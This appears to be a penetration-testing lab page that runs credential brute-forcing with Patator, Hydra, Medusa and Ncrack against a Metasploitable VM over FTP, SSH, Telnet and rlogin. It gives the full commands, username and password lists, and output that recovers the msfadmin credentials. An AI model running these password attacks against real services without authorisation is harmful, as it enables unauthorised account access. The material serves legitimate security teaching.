!!! danger "Goals"
    1. Practice with online password cracking tools
    2. Gain access to the Metasploitable machine through several different services

Assume the following lists (based on information found during the Recon and/or Scanning):

<table style="width: 30%">
    <tr><th>
        <pre>users.lst</pre>
    </th><th>
        <pre>passwords.lst</pre>
    </th></tr>
    <tr><td>
        <pre>
root
msfadmin
        </pre>
    </td><td>
        <pre>
12345
password
p@ssw0rd
@dm1n
msfadmin
        </pre>
    </td></tr>
</table>

!!! reminder "Words Dictionaries"
    In Kali, multiple dictionaries are available in folder `/usr/share/wordlists/` or John The Ripper also provides a dictionary file `/usr/share/john/password.lst`.

---

### Patator

**Reference**: [Patator on GitHub](https://github.com/lanjelot/patator)

**Command**: `patator`*`module`*` host=192.168.100.128 -U users.lst -P passwords.lst -M ssh`

- `-u` or `-U`: respectively a username or a text file with usernames (one per line)
- `-p` or `-P`: respectively a password or a text file with passwords (one per line)
- `-M`: the selected module (that is, the service to be attacked with a particular method)

<details><summary>**Outputs**</summary><p>
**Module**: `ftp_login`

~~~~{.console}
root@kali:~# patator ftp_login host=192.168.100.128 user=FILE0 password=FILE1 0=users.lst 1=passwords.lst
##:##:## patator    INFO - Starting Patator v0.6 (http://code.google.com/p/patator/) at ####-##-## ##:## ###
##:##:## patator    INFO -                                                                              
##:##:## patator    INFO - code  size   time | candidate                          |   num | mesg
##:##:## patator    INFO - -----------------------------------------------------------------------------
##:##:## patator    INFO - 230   17    0.014 | msfadmin:msfadmin                  |    10 | Login successful.
##:##:## patator    INFO - 530   16    2.572 | root:12345                         |     1 | Login incorrect.
##:##:## patator    INFO - 530   16    2.567 | root:password                      |     2 | Login incorrect.
##:##:## patator    INFO - 530   16    2.561 | root:p@ssw0rd                      |     3 | Login incorrect.
##:##:## patator    INFO - 530   16    2.540 | root:@dm1n                         |     4 | Login incorrect.
##:##:## patator    INFO - 530   16    2.565 | root:msfadmin                      |     5 | Login incorrect.
##:##:## patator    INFO - 530   16    2.547 | msfadmin:12345                     |     6 | Login incorrect.
##:##:## patator    INFO - 530   16    2.539 | msfadmin:password                  |     7 | Login incorrect.
##:##:## patator    INFO - 530   16    2.547 | msfadmin:p@ssw0rd                  |     8 | Login incorrect.
##:##:## patator    INFO - 530   16    2.552 | msfadmin:@dm1n                     |     9 | Login incorrect.
##:##:## patator    INFO - Hits/Done/Skip/Fail/Size: 10/10/0/0/10, Avg: 3 r/s, Time: 0h 0m 2s
~~~~

**Module**: `ssh_login`

~~~~{.console}
root@kali:~# patator ssh_login host=192.168.100.128 user=FILE0 password=FILE1 0=users.lst 1=passwords.lst
##:##:## patator    INFO - Starting Patator v0.6 (http://code.google.com/p/patator/) at ####-##-## ##:## ###
##:##:## patator    INFO -                                                                              
##:##:## patator    INFO - code  size   time | candidate                          |   num | mesg
##:##:## patator    INFO - -----------------------------------------------------------------------------
##:##:## patator    INFO - 0     37   10.152 | msfadmin:msfadmin                  |    10 | SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1
##:##:## patator    INFO - 1     22   11.648 | root:12345                         |     1 | Authentication failed.
##:##:## patator    INFO - 1     22   11.641 | root:password                      |     2 | Authentication failed.
##:##:## patator    INFO - 1     22   11.659 | root:p@ssw0rd                      |     3 | Authentication failed.
##:##:## patator    INFO - 1     22   11.658 | root:@dm1n                         |     4 | Authentication failed.
##:##:## patator    INFO - 1     22   11.645 | root:msfadmin                      |     5 | Authentication failed.
##:##:## patator    INFO - 1     22   11.651 | msfadmin:12345                     |     6 | Authentication failed.
##:##:## patator    INFO - 1     22   11.667 | msfadmin:password                  |     7 | Authentication failed.
##:##:## patator    INFO - 1     22   11.677 | msfadmin:p@ssw0rd                  |     8 | Authentication failed.
##:##:## patator    INFO - 1     22   11.675 | msfadmin:@dm1n                     |     9 | Authentication failed.
##:##:## patator    INFO - Hits/Done/Skip/Fail/Size: 10/10/0/0/10, Avg: 0 r/s, Time: 0h 0m 12s
~~~~

**Module**: `telnet_login`

~~~~{.console}
root@kali:~# patator telnet_login host=192.168.100.128 inputs='FILE0\nFILE1' 0=users.lst 1=passwords.lst persistent=0 prompt_re='Username:|Password:'
##:##:## patator    INFO - Starting Patator v0.6 (http://code.google.com/p/patator/) at ####-##-## ##:## ###
##:##:## patator    INFO -                                                                              
##:##:## patator    INFO - code  size   time | candidate                          |   num | mesg
##:##:## patator    INFO - -----------------------------------------------------------------------------
##:##:## patator    INFO - 0     50   20.031 | root:12345                         |     1 |  \r\n\r\nLogin incorrect\r\nmetasploitable login: 
##:##:## patator    INFO - 0     50   20.051 | root:password                      |     2 |  \r\n\r\nLogin incorrect\r\nmetasploitable login: 
##:##:## patator    INFO - 0     50   20.030 | root:p@ssw0rd                      |     3 |  \r\n\r\nLogin incorrect\r\nmetasploitable login: 
##:##:## patator    INFO - 0     50   20.052 | root:@dm1n                         |     4 |  \r\n\r\nLogin incorrect\r\nmetasploitable login: 
##:##:## patator    INFO - 0     50   20.032 | root:msfadmin                      |     5 |  \r\n\r\nLogin incorrect\r\nmetasploitable login: 
##:##:## patator    INFO - 0     50   20.030 | msfadmin:12345                     |     6 |  \r\n\r\nLogin incorrect\r\nmetasploitable login: 
##:##:## patator    INFO - 0     50   20.028 | msfadmin:password                  |     7 |  \r\n\r\nLogin incorrect\r\nmetasploitable login: 
##:##:## patator    INFO - 0     50   20.029 | msfadmin:p@ssw0rd                  |     8 |  \r\n\r\nLogin incorrect\r\nmetasploitable login: 
##:##:## patator    INFO - 0     50   20.027 | msfadmin:@dm1n                     |     9 |  \r\n\r\nLogin incorrect\r\nmetasploitable login: 
##:##:## patator    INFO - 0     555  20.031 | msfadmin:msfadmin                  |    10 |  \r\nLast login: ### ### ## ##:##:## #### on pts/5\r\nLinux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686\r\n\r\nThe programs included with the Ubuntu system are free software;\r\nthe exact distribution terms for each program are described in the\r\nindividual files in /usr/share/doc/*/copyright.\r\n\r\nUbuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by\r\napplicable law.\r\n\r\nTo access official Ubuntu documentation, please visit:\r\nhttp://help.ubuntu.com/\r\nNo mail.\r\nmsfadmin@metasploitable:~$ 
##:##:## patator    INFO - Hits/Done/Skip/Fail/Size: 10/10/0/0/10, Avg: 0 r/s, Time: 0h 0m 40s
~~~~
</p></details>

!!! note "Documentation"
    Patator is very well documented.
    It supports a very large list of modules that can be displayed using `patator -h`.
    Help on a particular module can be displayed using `patator `*`module`*` -h`.

---

### Hydra

**Reference**: [THC-Hydra on Kali Tools](http://tools.kali.org/password-attacks/hydra)

**Command**: `hydra-wizard`

**Inputs**:

 - Service: `ftp`
 - Target: `192.168.100.128`
 - Usernames file: `users.lst`
 - Passwords file: `passwords.lst`
 - No test for password same as login, ... ; just press Enter
 - No port number to be entered ; just press Enter
 - Command run confirmation : just press Enter

<details><summary>**Session**</summary><p>
~~~~{.console}
root@kali:~# hydra-wizard 

Welcome to the Hydra Wizard

Enter the service to attack (eg: ftp, ssh, http-post-form): ftp
Enter the target to attack (or filename with targets): 192.168.100.128
Enter a username to test or a filename: users.lst
Enter a password to test or a filename: passwords.lst
If you want to test for passwords (s)ame as login, (n)ull or (r)everse login, enter these letters without spaces (e.g. "sr") or leave empty otherwise: 
Port number (press enter for default): 

The following options are supported by the service module:
Hydra v8.3 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at ####-##-## ##:##:##

Help for module ftp:
============================================================================
The Module ftp does not need or support optional parameters

If you want to add module options, enter them here (or leave empty): 

The following command will be executed now:
 hydra -L users.lst -P passwords.lst -u    192.168.100.128 ftp

Do you want to run the command now? [Y/n] 

Hydra v8.3 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at ####-##-## ##:##:##
[DATA] max 10 tasks per 1 server, overall 64 tasks, 10 login tries (l:2/p:5), ~0 tries per task
[DATA] attacking service ftp on port 21
[21][ftp] host: 192.168.100.128   login: msfadmin   password: msfadmin
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at ####-##-## ##:##:##
~~~~
</p></details>

**Command**: `hydra -u -L users.lst -P passwords.lst 192.168.100.128 `*`module`*

- `-u`: loop around users, not passwords
- `-l` or `-L` (**L**ogin): respectively a username or a text file with usernames (one per line)
- `-p` or `-P`: respectively a password or a text file with passwords (one per line)

<details><summary>**Outputs**</summary><p>
**Module**: `ssh`

~~~~{.console}
root@kali:~# hydra -u -L users.lst -P passwords.lst 192.168.100.128 ssh
Hydra v8.3 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at ####-##-## ##:##:##
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 10 tasks per 1 server, overall 64 tasks, 10 login tries (l:2/p:5), ~0 tries per task
[DATA] attacking service ssh on port 22
[ERROR] target ssh://192.168.100.128:22/ does not support password authentication.
~~~~

**Module**: `telnet`

~~~~{.console}
root@kali:~# hydra -u -L users.lst -P passwords.lst 192.168.100.128 telnet
Hydra v8.3 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at ####-##-## ##:##:##
[WARNING] telnet is by its nature unreliable to analyze, if possible better choose FTP, SSH, etc. if available
[DATA] max 10 tasks per 1 server, overall 64 tasks, 10 login tries (l:2/p:5), ~0 tries per task
[DATA] attacking service telnet on port 23
[STATUS] 10.00 tries/min, 10 tries in 00:01h, 1 to do in 00:01h, 10 active
1 of 1 target completed, 0 valid passwords found
Hydra (http://www.thc.org/thc-hydra) finished at ####-##-## ##:##:##
~~~~

**Module**: `rlogin`

~~~~{.console}
root@kali:~# hydra -u -L users.lst -P passwords.lst 192.168.100.128 rlogin
Hydra v8.3 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at ####-##-## ##:##:##
[DATA] max 10 tasks per 1 server, overall 64 tasks, 10 login tries (l:2/p:5), ~0 tries per task
[DATA] attacking service rlogin on port 513
[513][rlogin] host: 192.168.100.128   login: root   password: 12345
[513][rlogin] host: 192.168.100.128   login: msfadmin   password: 12345
[513][rlogin] host: 192.168.100.128   login: root   password: password
[513][rlogin] host: 192.168.100.128   login: msfadmin   password: password
[513][rlogin] host: 192.168.100.128   login: msfadmin   password: @dm1n
[513][rlogin] host: 192.168.100.128   login: root   password: msfadmin
[513][rlogin] host: 192.168.100.128   login: msfadmin   password: msfadmin
[513][rlogin] host: 192.168.100.128   login: root   password: p@ssw0rd
[513][rlogin] host: 192.168.100.128   login: msfadmin   password: p@ssw0rd
[513][rlogin] host: 192.168.100.128   login: root   password: @dm1n
1 of 1 target successfully completed, 10 valid passwords found
Hydra (http://www.thc.org/thc-hydra) finished at ####-##-## ##:##:##
~~~~

Every attempt has failed !
</p></details>

!!! note "Remarks"
    Hydra normally supports a large variety of modules, seemingly more than Patator. But from the previous attempts, it seems that using it with SSH, Telnet and Rlogin is not trivial.
    It is documented (see `hydra -h`) and help on a particular module can be displayed using `hydra `*`module`*` -U`. However, for the particular cases of SSH, Telnet and Rlogin in the previous examples, no more parameter is to be set.

---

### Medusa

**Reference**: [Engelbretson, p83]

**Command**: `medusa -h 192.168.100.128 -U users.lst -P passwords.lst -M `*`module`*

- `-h`: target host
- `-u` or `-U`: respectively a username or a text file with usernames (one per line)
- `-p` or `-P`: respectively a password or a text file with passwords (one per line)
- `-M`: the selected module (that is, the service to be attacked)

<details><summary>**Output**</summary><p>
**Module**: `ssh`

~~~~{.console}
root@kali:~# medusa -h 192.168.100.128 -U users.lst -P passwords.lst -M ssh
Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

ACCOUNT CHECK: [ssh] Host: 192.168.100.128 (1 of 1, 0 complete) User: root (1 of 2, 0 complete) Password: 12345 (1 of 5 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.100.128 (1 of 1, 0 complete) User: root (1 of 2, 0 complete) Password: password (2 of 5 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.100.128 (1 of 1, 0 complete) User: root (1 of 2, 0 complete) Password: p@ssw0rd (3 of 5 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.100.128 (1 of 1, 0 complete) User: root (1 of 2, 0 complete) Password: @dm1n (4 of 5 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.100.128 (1 of 1, 0 complete) User: root (1 of 2, 0 complete) Password: msfadmin (5 of 5 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.100.128 (1 of 1, 0 complete) User: msfadmin (2 of 2, 1 complete) Password: 12345 (1 of 5 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.100.128 (1 of 1, 0 complete) User: msfadmin (2 of 2, 1 complete) Password: password (2 of 5 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.100.128 (1 of 1, 0 complete) User: msfadmin (2 of 2, 1 complete) Password: p@ssw0rd (3 of 5 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.100.128 (1 of 1, 0 complete) User: msfadmin (2 of 2, 1 complete) Password: @dm1n (4 of 5 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.100.128 (1 of 1, 0 complete) User: msfadmin (2 of 2, 1 complete) Password: msfadmin (5 of 5 complete)
ACCOUNT FOUND: [ssh] Host: 192.168.100.128 User: msfadmin Password: msfadmin [SUCCESS]
~~~~

This example took more than 1 minute to complete (against 12 seconds for Patator).
</p></details>

!!! note "Remarks"
    Medusa also supports a large variety of modules whose a few ones are not by Patator (e.g. CVS, NCP, PcAnywhere).
    It does not seem to be documented very well but can complement Patator.
    Note that Medusa seems to be much slower than Patator.

---

### Ncrack

**Reference**: [Ncrack on Kali Tools](http://tools.kali.org/password-attacks/ncrack)

**Command**: `ncrack -U users.lst -P passwords.lst 192.168.100.128`

- `-u` or `-U`: respectively a username or a text file with usernames (one per line)
- `-P`: a text file with passwords (one per line)
- `-p`: the protocol to be attacked
- `-v`, `-vv`: verbose levels

<details><summary>**Output**</summary><p>
**Module**: `ssh`

~~~~{.console}
root@kali:~# ncrack -vv -U users.lst -P passwords.lst -p ssh 192.168.100.128

Starting Ncrack 0.5 ( http://ncrack.org ) at ####-##-## ##:## ###

Discovered credentials on ssh://192.168.100.128:22 'msfadmin' 'msfadmin'
ssh://192.168.100.128:22 finished.

Discovered credentials for ssh on 192.168.100.128 22/tcp:
192.168.100.128 22/tcp ssh: 'msfadmin' 'msfadmin'

Ncrack done: 1 service scanned in 108.01 seconds.
Probes sent: 8 | timed-out: 0 | prematurely-closed: 6

Ncrack finished.
~~~~

</p></details>

!!! note "Remarks"
    Ncrack only supports RDP, SSH, HTTP(S), SMB, POP3(S), VNC, FTP, and Telnet.
    Moreover, it seems to be very slow.

---

!!! important "Findings"

    **Credentials**: username `msfadmin`, password `msfadmin`

    **Accesses Gained**:

    - **FTP**
    - **SSH**
    - **Telnet**
